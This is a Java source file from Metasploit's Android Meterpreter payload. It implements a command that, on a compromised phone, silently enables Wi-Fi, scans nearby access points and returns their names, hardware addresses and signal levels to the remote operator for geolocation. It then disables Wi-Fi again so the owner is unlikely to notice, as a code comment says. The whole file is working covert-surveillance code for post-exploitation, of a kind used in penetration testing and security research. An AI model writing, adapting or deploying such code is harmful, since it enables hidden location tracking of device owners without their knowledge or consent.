package com.metasploit.meterpreter.android;

import java.util.List;

import android.app.Activity;
import android.os.Handler;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.TextView;
import android.widget.Toast;
import android.util.Log;

import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;

public class android_wlan_geolocate implements Command {
    private static final int TLV_EXTENSIONS = 20000;
    public static final int TLV_TYPE_WLAN_GROUP = TLVPacket.TLV_META_TYPE_GROUP
            | (TLV_EXTENSIONS + 9022);
    public static final int TLV_TYPE_WLAN_BSSID = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9023);
    public static final int TLV_TYPE_WLAN_SSID = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9024);
    public static final int TLV_TYPE_WLAN_LEVEL = TLVPacket.TLV_META_TYPE_UINT
            | (TLV_EXTENSIONS + 9025);

    WifiManager mainWifi;
    WifiReceiver receiverWifi;
    List<ScanResult> wifiList;
    Object scanready = new Object();
    boolean WifiStatus;

    class WifiReceiver extends BroadcastReceiver {

        @Override
        public void onReceive(Context c, Intent intent) {
            synchronized (scanready) {
                wifiList = mainWifi.getScanResults();
                scanready.notifyAll();
            }
        }
    }

    @Override
    public int execute(Meterpreter meterpreter, TLVPacket request,
                       TLVPacket response) throws Exception {
        AndroidMeterpreter androidMeterpreter = (AndroidMeterpreter) meterpreter;
        final Context context = androidMeterpreter.getContext();

        mainWifi = (WifiManager) context.getSystemService(context.WIFI_SERVICE);
        WifiStatus=mainWifi.isWifiEnabled();
        if (WifiStatus == false) {
            // If wifi is disabled, enable it
            mainWifi.setWifiEnabled(true);
        }

        receiverWifi = new WifiReceiver();
        context.registerReceiver(receiverWifi,
            new IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION));
        mainWifi.startScan();

        wifiList=null;
        synchronized (scanready) {
            scanready.wait(30000);

            // If wifi was disabled when process started, turn it off again
            // hopefully fast-enough that user won't notice =)
            if (WifiStatus == false) {
                mainWifi.setWifiEnabled(false);
            }

            if (wifiList.size()==0) {
                return ERROR_FAILURE;
            }

            for (int i = 0; i < wifiList.size(); i++) {
                TLVPacket pckt=new TLVPacket();
                pckt.addOverflow(TLV_TYPE_WLAN_SSID,wifiList.get(i).SSID);
                pckt.addOverflow(TLV_TYPE_WLAN_BSSID,wifiList.get(i).BSSID);
                int level=0;
                level = mainWifi.calculateSignalLevel(wifiList.get(i).level,100);
                pckt.addOverflow(TLV_TYPE_WLAN_LEVEL,level);
                response.addOverflow(TLV_TYPE_WLAN_GROUP, pckt);
            }
        }

        return ERROR_SUCCESS;
    }
}

